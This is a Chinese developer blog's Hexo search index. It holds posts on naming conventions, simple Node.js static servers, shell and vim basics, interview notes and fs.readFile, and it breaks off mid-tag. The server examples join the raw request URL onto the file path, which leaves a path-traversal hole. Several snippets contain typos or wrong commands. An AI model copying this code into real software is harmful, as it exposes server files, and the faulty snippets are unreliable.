<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>grid布局</title>
      <link href="/2018/11/25/grid%E5%B8%83%E5%B1%80/"/>
      <url>/2018/11/25/grid%E5%B8%83%E5%B1%80/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>xxx</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Quick Start</title>
      <link href="/2018/11/25/quick-start/"/>
      <url>/2018/11/25/quick-start/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.<br><a id="more"></a></p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>增强代码可读性</title>
      <link href="/2018/09/18/%E5%A2%9E%E5%BC%BA%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7/"/>
      <url>/2018/09/18/%E5%A2%9E%E5%BC%BA%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>词性和一致性<br><a id="more"></a></p><h2 id="优化基本原则"><a href="#优化基本原则" class="headerlink" title="优化基本原则"></a>优化基本原则</h2><ul><li>易读性优先</li><li>如果不是性能瓶颈，就不要为了性能改写代码</li><li>复杂性守恒原则：无论怎么写代码，复杂性都不会消失。如果逻辑复杂，代码就应该是复杂的；如果逻辑简单，代码就应该是简单的</li></ul><h2 id="注意词性"><a href="#注意词性" class="headerlink" title="注意词性"></a>注意词性</h2><h3 id="普通变量-属性用「名词」"><a href="#普通变量-属性用「名词」" class="headerlink" title="普通变量/属性用「名词」"></a>普通变量/属性用「名词」</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    name: &apos;Joyce&apos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var student = &#123;</span><br><span class="line">    grade: 3,</span><br><span class="line">    class: 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="布尔变量或属性用「形容词」-「be动词」-「情态动词」-「hasXXX」"><a href="#布尔变量或属性用「形容词」-「be动词」-「情态动词」-「hasXXX」" class="headerlink" title="布尔变量或属性用「形容词」/「be动词」/「情态动词」/「hasXXX」"></a>布尔变量或属性用「形容词」/「be动词」/「情态动词」/「hasXXX」</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    dead: false, // 如果是形容词，前面就没必要加 is，比如isDead 就很废话</span><br><span class="line">    isVip: true, // be 动词有 is、was 等，后面一般接名词</span><br><span class="line">    canSpeak: true, //情态动词有 can、should、will、need 等，情态动词后面接动词</span><br><span class="line">    hasChildren: true, // has 加名词</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="普通函数或方法用「动词」"><a href="#普通函数或方法用「动词」" class="headerlink" title="普通函数或方法用「动词」"></a>普通函数或方法用「动词」</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    run()&#123;&#125;, // 不及物动词</span><br><span class="line">    drinkWater()&#123;&#125;, // 及物动词</span><br><span class="line">    eat(foo)&#123;&#125;, // 及物动词加参数（参数是名词）</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="回调、钩子函数用「介词」开头，或用「动词的现在完成时态」"><a href="#回调、钩子函数用「介词」开头，或用「动词的现在完成时态」" class="headerlink" title="回调、钩子函数用「介词」开头，或用「动词的现在完成时态」"></a>回调、钩子函数用「介词」开头，或用「动词的现在完成时态」</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    beforeDie()&#123;&#125;,</span><br><span class="line">    afterDie()&#123;&#125;,</span><br><span class="line">    // 或者</span><br><span class="line">    beforeDie()&#123;&#125;,</span><br><span class="line">    dead()&#123;&#125; // 这里跟 布尔 冲突，但只要不同时暴露 布尔 dead 和函数 dead 就行，不想冲突就用上面的 afterDie</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">eg: button.addEventListener(&apos;click&apos;, onButtonClick)</span><br><span class="line"></span><br><span class="line">var component = &#123;</span><br><span class="line">    beforeCreate()&#123;&#125;,</span><br><span class="line">    created()&#123;&#125;,</span><br><span class="line">    beforeMount()&#123;&#125;,</span><br><span class="line">    mounted()&#123;&#125;,</span><br><span class="line">    beforeUpdate()&#123;&#125;,</span><br><span class="line">    updated()&#123;&#125;,</span><br><span class="line">    activated()&#123;&#125;,</span><br><span class="line">    deactivated()&#123;&#125;,</span><br><span class="line">    beforeDestroy()&#123;&#125;,</span><br><span class="line">    destroyed()&#123;&#125;,</span><br><span class="line">    errorCaptured()&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="容易混淆的地方加前缀"><a href="#容易混淆的地方加前缀" class="headerlink" title="容易混淆的地方加前缀"></a>容易混淆的地方加前缀</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">div1.classList.add(&apos;active&apos;)  // DOM对象</span><br><span class="line">div2.addClass(&apos;active&apos;)  // jQuery对象</span><br><span class="line"></span><br><span class="line">可以改写成：</span><br><span class="line">domDiv1.classList.add(&apos;active&apos;) or elDiv1.classList.add(&apos;active&apos;)</span><br><span class="line">$div2.addClass(&apos;active&apos;)</span><br></pre></td></tr></table></figure><h2 id="注意一致性"><a href="#注意一致性" class="headerlink" title="注意一致性"></a>注意一致性</h2><h3 id="介词一致性"><a href="#介词一致性" class="headerlink" title="介词一致性"></a>介词一致性</h3><p>如果你使用了 before + after，那么就在代码的所有地方都坚持使用 如果你使用了 before + 完成时，那么就坚持使用 如果你改来改去，就「不一致」了，不一致将导致「不可预测」</p><h3 id="顺序一致性"><a href="#顺序一致性" class="headerlink" title="顺序一致性"></a>顺序一致性</h3><p>比如 updateContainerWidth 和 updateHeightOfContainer 的顺序就令人很别扭，同样会引发「不可预测」</p><h3 id="表里一致性"><a href="#表里一致性" class="headerlink" title="表里一致性"></a>表里一致性</h3><p>函数名即能体现函数功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function getSongs()&#123;</span><br><span class="line">  return $.get(&apos;/songs).then((response)&#123;</span><br><span class="line">    div.innerText = response.songs</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>函数名 getSongs 表示获取歌曲，并没有暗示这个函数会更新页面，但是实际上函数更新了 div，造成表里不一，正确的写法是</p><ul><li><p>纠正函数名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function getSongsAndUpdateDiv()&#123;</span><br><span class="line">  return $.get(&apos;/songs).then((response)&#123;</span><br><span class="line">    div.innerText = response.songs</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>拆分成两个函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function getSongs()&#123;</span><br><span class="line">  return $.get(&apos;/songs)</span><br><span class="line">&#125;</span><br><span class="line">function updateDiv(songs)&#123;</span><br><span class="line">  div.innerText = response.songs</span><br><span class="line">&#125;</span><br><span class="line">getSongs().then((response)=&gt;&#123;</span><br><span class="line">  updateDiv(response.songs)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>搭建简易服务器</title>
      <link href="/2018/08/29/%E6%90%AD%E5%BB%BA%E7%AE%80%E6%98%93%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2018/08/29/%E6%90%AD%E5%BB%BA%E7%AE%80%E6%98%93%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="一个简单的静态服务器"><a href="#一个简单的静态服务器" class="headerlink" title="一个简单的静态服务器"></a>一个简单的静态服务器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">var http = require(&apos;http&apos;)</span><br><span class="line">var fs = require(&apos;fs&apos;)</span><br><span class="line"></span><br><span class="line">var server = http.createServer(function(req, res)&#123;</span><br><span class="line">  try&#123;</span><br><span class="line">    var fileContent = fs.readFileSync(__dirname + &apos;/static&apos; + req.url)</span><br><span class="line">    res.write(fileContent)</span><br><span class="line">  &#125;catch(e)&#123;</span><br><span class="line">    res.writeHead(404, &apos;not found&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">  res.end()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">server.listen(8080)</span><br><span class="line">console.log(&apos;visit http://localhost:8080&apos; )</span><br></pre></td></tr></table></figure><h2 id="支持静态文件动态路由的服务器"><a href="#支持静态文件动态路由的服务器" class="headerlink" title="支持静态文件动态路由的服务器"></a>支持静态文件动态路由的服务器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">var http = require(&apos;http&apos;)</span><br><span class="line">var fs = require(&apos;fs&apos;)</span><br><span class="line">var url = require(&apos;url&apos;)  // 引入url模块解析url地址，eg：127.0.0.1:8080/index.html?a=1&amp;b=2 需要将?后的参数去掉</span><br><span class="line"></span><br><span class="line">http.createServer(function(req, res)&#123;</span><br><span class="line">  var pathObj = url.parse(req.url, true)</span><br><span class="line">  console.log(pathObj)</span><br><span class="line"></span><br><span class="line">  switch (pathObj.pathname) &#123;  // 路由</span><br><span class="line">    case &apos;/getWeather&apos;:</span><br><span class="line">      var ret</span><br><span class="line">      if(pathObj.query.city == &apos;beijing&apos;)&#123;</span><br><span class="line">        ret = &#123; city: &apos;beijing&apos;, weather: &apos;晴天&apos; &#125;</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">        ret = &#123; city: pathObj.query.city, weather: &apos;不知道&apos; &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      res.end(JSON.stringify(ret))</span><br><span class="line">      break;</span><br><span class="line">    default:</span><br><span class="line">        try&#123;  // 静态服务器</span><br><span class="line">            var fileContent = fs.readFileSync(__dirname + &apos;/static&apos; + pathObj.pathnamel)</span><br><span class="line">            res.write(fileContent)</span><br><span class="line">            &#125;catch(e)&#123;</span><br><span class="line">                res.writeHead(404, &apos;not found&apos;)</span><br><span class="line">            &#125;</span><br><span class="line">       res.end( )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;).listen(8080)</span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>命令行基础操作</title>
      <link href="/2018/08/28/%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/"/>
      <url>/2018/08/28/%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>记下平时常用的命令<br><a id="more"></a><br>在学习命令行的过程中，遇到不懂的命令及用法，可在网站： explainshell.com 来查看学习</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>1、绝对路径和相对路径：以 / 开头的就是绝对路径，其他就是相对路径</p><p>2、基本符号的含义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~  用户目录（mac中的家目录）  eg：/Users /mxy</span><br><span class="line">/  根目录，整个系统</span><br><span class="line">.  所在当前目录</span><br><span class="line">..  父级目录，即当前目录的上级目录</span><br><span class="line">$  提示符，表示可以输入命令</span><br></pre></td></tr></table></figure></p><h2 id="简单操作"><a href="#简单操作" class="headerlink" title="简单操作"></a>简单操作</h2><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><ul><li><p>不包括隐藏文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br></pre></td></tr></table></figure></li><li><p>查看所有文件（包括隐藏）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls -a</span><br></pre></td></tr></table></figure></li><li><p>查看当前目录下所有路径详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l</span><br></pre></td></tr></table></figure></li><li><p>前两种的结合，即查看当前目录下所有文件的详细信息（包括隐藏文件）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al</span><br></pre></td></tr></table></figure></li></ul><h3 id="切换目录：cd"><a href="#切换目录：cd" class="headerlink" title="切换目录：cd"></a>切换目录：cd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd 文件名</span><br></pre></td></tr></table></figure><p>返回上一级文件夹（即返回 ~ 家目录）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd ..</span><br></pre></td></tr></table></figure></p><p>切换至当前目录下的文件夹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd ./文件名  等同于   $ cd 文件名</span><br></pre></td></tr></table></figure></p><h3 id="文件相关"><a href="#文件相关" class="headerlink" title="文件相关"></a>文件相关</h3><ul><li><p>创建文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ touch 1.txt  // 如果没有则新建，如果有则改变文件最后更新时间</span><br></pre></td></tr></table></figure></li><li><p>删除文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ rm 文件路径  // 删除文件</span><br><span class="line">$ rm -f 文件路径  // 强制删除文件（-f：强制）</span><br><span class="line">$ rm -r 目录路径  // 删除目录（-r：递归）</span><br><span class="line">$ rm -rf 目录路径  // 强制删除目录，目录只能递归地删除，没有-r目录删除不掉，没有-f则会一遍遍询问是否删除</span><br></pre></td></tr></table></figure></li><li><p>移动文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mv 1.txt 111.txt  // 重命名</span><br><span class="line">$ mv 1.txt demo  // 将文件1.txt移动到demo文件夹</span><br></pre></td></tr></table></figure></li><li><p>创建文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir text</span><br></pre></td></tr></table></figure></li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li>pwd  // 快速查看当前路径</li><li>tree 目录名  // 查看目录结构</li><li>tldr 命令  // 快速查询一个命令怎么使用</li><li>clear  // 清屏</li><li>history  // 查看历史操作</li></ul><h2 id="vim的使用"><a href="#vim的使用" class="headerlink" title="vim的使用"></a>vim的使用</h2><p>1、创建index.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ touch index.html</span><br></pre></td></tr></table></figure></p><p>2、编辑index.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vi index.html</span><br></pre></td></tr></table></figure></p><p>3、按下键盘上的 i 键进入编辑模式</p><p>4、按下 esc 退出编辑模式</p><p>5、保存与不保存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:wq!  保存并退出</span><br><span class="line">:aq!  不保存并退出</span><br></pre></td></tr></table></figure></p><p>6、查看文件结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat 文件名  // 显示文件内容</span><br><span class="line">$ cat 文件1 文件2 &gt; 文件3  //  将文件1和文件2合并放进文件3，文件3原本内容被替代，如果不存在文件3则新建一个</span><br></pre></td></tr></table></figure></p><p>花式练vim：<br><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTk1ODE0MA==&amp;mid=2648436205&amp;idx=1&amp;sn=31783b90ad372c27457e6c394659d9b2&amp;chksm=be82d8fe89f551e8b035c03919230a470b5bc6324e219f46a2b4478f368d2fdee491518b1987&amp;mpshare=1&amp;scene=1&amp;srcid=0605oexPQ6Bh0PamzpiSjQ6a&amp;key=10a5f2b3370ca265748cfcc6b93af05ec9bb9c614f130b6d3b4665b31af06dcd1225ced8fc7d27e11c4c00ff365f2829ea5547ff3468d07ac58745d792bae9a42b98063c8da7c478062b5a7e463c0a50&amp;ascene=0&amp;uin=OTAyMTc5NDQw&amp;devicetype=iMac+MacBookAir5%2C1+OSX+OSX+10.13.5+build(17F59b)&amp;version=12020010&amp;nettype=WIFI&amp;lang=zh_CN&amp;fontScale=100&amp;pass_ticket=QcUzX%2FQH9oKZGdPAAFIYmpJrFUAPwy8JLfcrE9YCcLSVoFyC6bRxWS8Dbhpbatp%2F" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MjM5MTk1ODE0MA==&amp;mid=2648436205&amp;idx=1&amp;sn=31783b90ad372c27457e6c394659d9b2&amp;chksm=be82d8fe89f551e8b035c03919230a470b5bc6324e219f46a2b4478f368d2fdee491518b1987&amp;mpshare=1&amp;scene=1&amp;srcid=0605oexPQ6Bh0PamzpiSjQ6a&amp;key=10a5f2b3370ca265748cfcc6b93af05ec9bb9c614f130b6d3b4665b31af06dcd1225ced8fc7d27e11c4c00ff365f2829ea5547ff3468d07ac58745d792bae9a42b98063c8da7c478062b5a7e463c0a50&amp;ascene=0&amp;uin=OTAyMTc5NDQw&amp;devicetype=iMac+MacBookAir5%2C1+OSX+OSX+10.13.5+build(17F59b)&amp;version=12020010&amp;nettype=WIFI&amp;lang=zh_CN&amp;fontScale=100&amp;pass_ticket=QcUzX%2FQH9oKZGdPAAFIYmpJrFUAPwy8JLfcrE9YCcLSVoFyC6bRxWS8Dbhpbatp%2F</a></p><h2 id="查看全局安装过的包"><a href="#查看全局安装过的包" class="headerlink" title="查看全局安装过的包"></a>查看全局安装过的包</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm list -g --depth 0</span><br></pre></td></tr></table></figure><p>-g 全局安装的<br>list 罗列已安装的node包<br><img src="https://i.loli.net/2018/08/28/5b8551474a6bd.png" alt="alt text"></p>]]></content>
      
      
        <tags>
            
            <tag> 命令行 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>面试题总结（一）</title>
      <link href="/2018/08/27/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2018/08/27/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>考察了一些基础知识点<br><a id="more"></a><br><img src="https://i.loli.net/2018/08/27/5b83d9d5278e6.jpeg" alt="alt text"><br><img src="https://i.loli.net/2018/08/27/5b83d9e41ca13.jpeg" alt="alt text"><br><img src="https://i.loli.net/2018/08/27/5b83d9ebdfb06.jpeg" alt="alt text"></p><p>1、考察内存机制<br><img src="https://i.loli.net/2018/08/27/5b83da81b01aa.jpeg" alt="alt text"><br>实际打印出来type、size都是全局作用域下的值，在内存图中它们是以值的方式存储，而对于format是一个数组，对于引用类型的值，它在内存图中是以地址的方式存储，当你往同一个地址（format数组）push值，就会更新数据，因此打印出来的只有数组发生了更新</p><p>2、考察JS单线程的执行机制<br>在前面的一篇博客中有总结过JS的执行机制，这里打印的顺序为：1 -&gt; 3 -&gt; 6 -&gt; 4 -&gt; undefined -&gt; 2<br><img src="https://i.loli.net/2018/08/27/5b83de846d6b2.png" alt="alt text"></p><p>当进入这段代码，这是一个宏任务，首先打印1；看到setTimeout属于另一个宏任务，将它放在宏任务对列里；看到Promise是同步任务，执行并打印3；看到then属于微任务，将它放在这段代码（宏任务）下的微任务对列里；随后打印6；此时一轮宏任务执行完毕，看微任务队列有一个任务then，它会打印成功函数4，而失败函数5不会被打印出来；此时再去查看宏任务对列有一个setTimeout函数，执行并打印出2。</p><p>3、考察数组去重，可以用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = [1,2,5,1,4,5,2,4,3]</span><br><span class="line">Array.from(new Set(a))</span><br></pre></td></tr></table></figure></p><p>但题目还绕了一个弯，需要用两次reverse()方法使得“重复则保留最后出现的数值”</p><p>4、考察正则，当时看到就两眼蒙逼，根本不会写正则</p><p>方大大给出的做法：<img src="https://i.loli.net/2018/08/27/5b83e05833b88.jpeg" alt="alt text"></p><p>5、用到Promise.all的方法</p><p>// Promise.all, 当所有的 Promise 对象都完成后再执行<br><img src="https://i.loli.net/2018/08/27/5b83e09637993.jpeg" alt="alt text"></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>CRM法入门node.js</title>
      <link href="/2018/08/24/CRM%E6%B3%95%E5%85%A5%E9%97%A8node-js/"/>
      <url>/2018/08/24/CRM%E6%B3%95%E5%85%A5%E9%97%A8node-js/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>CRM套路入门node.js<br><a id="more"></a></p><h2 id="CRM套路"><a href="#CRM套路" class="headerlink" title="CRM套路"></a>CRM套路</h2><ul><li>C（copy）抄</li><li>R（run）运行</li><li>M（modify）修改<h2 id="fs-文件系统"><a href="#fs-文件系统" class="headerlink" title="fs 文件系统"></a>fs 文件系统</h2><h3 id="fs-readFile-path-options-callback-异步读取文件"><a href="#fs-readFile-path-options-callback-异步读取文件" class="headerlink" title="fs.readFile(path[, options], callback)异步读取文件"></a>fs.readFile(path[, options], callback)异步读取文件</h3>1、新建text.js文件，编辑text.js文件如下：（官方文档抄）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fs.readFile(&apos;/404&apos;, (err, data) =&gt; &#123;  // 首先给出一个绝对不存在的文件/404</span><br><span class="line">  if (err) throw err;</span><br><span class="line">  console.log(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><p>2、命令行输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node text.js  // 运行文件会看到抛出错误</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/08/24/5b7ffea7254cf.png" alt="alt text"></p><p>3、解决方法是在文件顶部加入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let fs = require(&apos;fs&apos;)  // 从node中加载该模块</span><br></pre></td></tr></table></figure></p><p>4、此时重新运行，看到报错为没有该/404文件<br><img src="https://i.loli.net/2018/08/24/5b7ffea6e9735.png" alt="alt text"></p><p>5、此时在桌面创建一个1.txt文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let fs = require(&apos;fs&apos;)</span><br><span class="line">fs.readFile(&apos;/Users/ringcrl/Desktop/1.txt&apos;, (err, data) =&gt; &#123;  // 切记这里创建的文件不能写成~/Desktop/1.txt，命令行可以识别~，没说nodejs也可以！！！</span><br><span class="line">  console.log(err);  // 这里将错误和数据都打印出来</span><br><span class="line">  console.log(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/08/24/5b80008e4a363.png" alt="alt text"></p><p>6、调用data.toString<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 